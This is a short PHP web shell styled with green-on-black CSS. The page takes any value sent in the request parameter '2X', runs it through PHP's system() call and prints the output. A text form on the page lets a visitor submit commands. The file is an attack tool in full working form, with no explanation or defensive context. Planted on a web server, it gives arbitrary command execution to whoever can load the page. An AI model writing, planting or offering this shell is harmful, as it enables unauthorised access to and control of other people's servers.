<head>
<style>
    pre {color:green;
        border: 5px solid;
        border-radius:10px;
        border-color:black;
        background-color:black;
        font-size: 20;}
    body {background-color:gray}
    input {background-color:black;
        color:red;
        width: 300px;}
    form {margin:0 auto;
        width:400px;}
</style>
</head>
<body>
<div>
<?php
if(isset($_REQUEST['2X'])){
    $command = $_REQUEST['2X'];
    echo "<pre>";
    system($command);
    echo "</pre>";
}
?>
</div>
<br>
<div>
<form>
    <input type="text" name="2X">
</form>
</div>
</body>
